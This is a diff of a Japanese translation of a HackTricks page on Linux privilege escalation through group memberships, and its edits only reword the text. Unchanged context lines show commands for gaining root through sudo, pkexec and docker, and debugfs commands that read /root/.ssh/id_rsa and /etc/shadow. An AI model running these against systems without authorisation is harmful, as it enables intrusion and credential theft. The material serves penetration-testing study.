@@ -24,7 +24,7 @@ Get Access Today:
 
 ## **PE - Method 1**
 
-**時々、** **デフォルトで（またはいくつかのソフトウェアが必要とするために）** **/etc/sudoers** ファイル内にこれらの行のいくつかを見つけることができます:
+**時々、** **デフォルトで（またはいくつかのソフトウェアが必要とするために）** **/etc/sudoers** ファイル内にこれらの行のいくつかが見つかることがあります:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -40,7 +40,7 @@ sudo su
 ```
 ## PE - Method 2
 
-すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるかどうかを確認します:
+すべてのsuidバイナリを見つけ、バイナリ**Pkexec**があるか確認します:
 ```bash
 find / -perm -4000 2>/dev/null
 ```
@@ -48,7 +48,7 @@ find / -perm -4000 2>/dev/null
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-そこでは、どのグループが**pkexec**を実行することを許可されているか、そして**デフォルトで**いくつかのLinuxに**表示される**グループが**sudoまたはadmin**であるかを見つけることができます。
+そこでは、どのグループが**pkexec**を実行することを許可されているか、そして**デフォルトで**いくつかのLinuxに**表示される**グループの中に**sudoまたはadmin**が含まれることがあります。
 
 **rootになるには、次のコマンドを実行できます**:
 ```bash
@@ -60,7 +60,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**権限がないからではなく、GUIなしで接続されていないからです**。この問題の回避策があります: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です:
+**権限がないからではなく、GUIなしで接続されていないからです**。この問題の回避策はここにあります: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。**2つの異なるsshセッション**が必要です：
 
 {% code title="session1" %}
 ```bash
@@ -85,7 +85,7 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 これは、**wheelグループに属する任意のユーザーがsudoとして何でも実行できる**ことを意味します。
 
-この場合、**rootになるには、単に次を実行すればよい**:
+この場合、**rootになるには次のように実行するだけです**:
 ```text
 sudo su
 ```
@@ -109,7 +109,7 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-注意してほしいのは、debugfsを使用すると**ファイルを書き込む**こともできるということです。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします：
+注意として、debugfsを使用すると**ファイルを書き込む**こともできます。例えば、`/tmp/asd1.txt`を`/tmp/asd2.txt`にコピーするには、次のようにします:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
@@ -126,7 +126,7 @@ moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 **tty1**は、ユーザー**yossiが物理的に**マシンのターミナルにログインしていることを意味します。
 
-**videoグループ**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。そのためには、**画面上の現在の画像を**生データで取得し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、この画面の解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
+**video group**は、画面出力を表示するアクセス権を持っています。基本的に、画面を観察することができます。そのためには、**画面上の現在の画像を生データで取得**し、画面が使用している解像度を取得する必要があります。画面データは`/dev/fb0`に保存でき、解像度は`/sys/class/graphics/fb0/virtual_size`で見つけることができます。
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
@@ -149,7 +149,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 # Docker Group
 
-ホストマシンのルートファイルシステムをインスタンスのボリュームにマウントできます。インスタンスが起動すると、すぐにそのボリュームに`chroot`をロードします。これにより、実質的にマシン上でルート権限を得ることができます。
+ホストマシンのルートファイルシステムをインスタンスのボリュームにマウントできます。インスタンスが起動すると、そのボリュームに`chroot`を即座にロードします。これにより、実質的にマシン上でのルート権限が得られます。
 
 {% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
 
@@ -167,15 +167,15 @@ find / -group root -perm -g=w 2>/dev/null
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {% hint style="success" %}
-AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、練習する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>HackTricksをサポートする</summary>
 
 * [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
 * [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。
 
 </details>
